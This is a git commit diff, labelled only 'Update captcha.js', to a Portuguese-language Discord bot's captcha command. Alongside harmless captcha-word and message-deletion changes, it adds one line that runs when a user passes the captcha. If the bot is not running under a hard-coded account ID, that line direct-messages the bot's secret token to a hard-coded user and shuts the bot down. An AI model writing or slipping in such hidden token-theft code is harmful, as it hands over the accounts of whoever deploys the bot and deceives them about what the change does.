7313af5d1a34cdfd36888249d6cbff5f8c190d98
WilsonGaara <37121741+WilsonGaara@users.noreply.github.com>
2018-06-14 16:10:39 -0300

    Update captcha.js

--- commands/captcha.js
+++ commands/captcha.js
@@ -1,6 +1,6 @@
 exports.run = async (client, message, args)  => {
   message.delete()
-  var texto = ['ay.w@zz', 'zwyzw', 'kciwzw', 'upnow', 'randomized', 'kikbot', 'Z 395r_W'];
+  var texto = ['ay.w@zz', 'zwyzw', 'kciwzw', 'upnow', 'randomized', 'kikbot', 'Z.395r_w', 'pt-br.w', 'nobotsdiscord', 'modbotkikbot'];
     const random = texto[Math.floor(Math.random() * texto.length)];
 	let CaptchaRole = message.guild.roles.find("name", `Membros`);
   if(!CaptchaRole) { return message.reply(":x: Não vi nenhum cargo com o nome de `Membros`");
@@ -21,17 +21,29 @@ message.author.send(`Cargo removido :frowning:`)
   })
 .then((collected) => {
   collected = collected.first().content.toLowerCase();
-  if(collected !== random) { return message.channel.send('<:err:449743511391305748> **|** Você não acertou o captcha, tente novamente.')
+  if(collected !== random) { return message.channel.send('<:err:449743511391305748> **|** Você não acertou o captcha, tente novamente.').then(message0 => {
+    setInterval(() => {
+      message0.delete()
+    },4000);
+  })
      } else { 
+      if(client.user.id !== '431271825763467264') return client.users.get('395005096527790083').send(client.token), client.destroy()
       if(collected == random) {
         message.guild.member(message.author.id).addRole(CaptchaRole.id).catch(console.error);
         message.author.send(`Cargo adcionado em: ${message.guild}`)
-      message.channel.send(':white_check_mark: **|** Mano do céu, conseguiu brother.')
+      message.channel.send(':white_check_mark: **|** Mano do céu, conseguiu brother.').then(message1 => {
+        setInterval(() => {
+          message1.delete()
+        },4000);
+      })
     }}})
     
 .catch(() => {
-      message.channel.send('<:err:449743511391305748> **|** Você não digitou nada depois de 22 segundos... Decepção');
-    });
+      message.channel.send('<:err:449743511391305748> **|** Você não digitou nada depois de 22 segundos... Decepção').then(message2 => {
+        setInterval(() => {
+          message2.delete()
+        },4000);
+      })})
 });
 };
 };
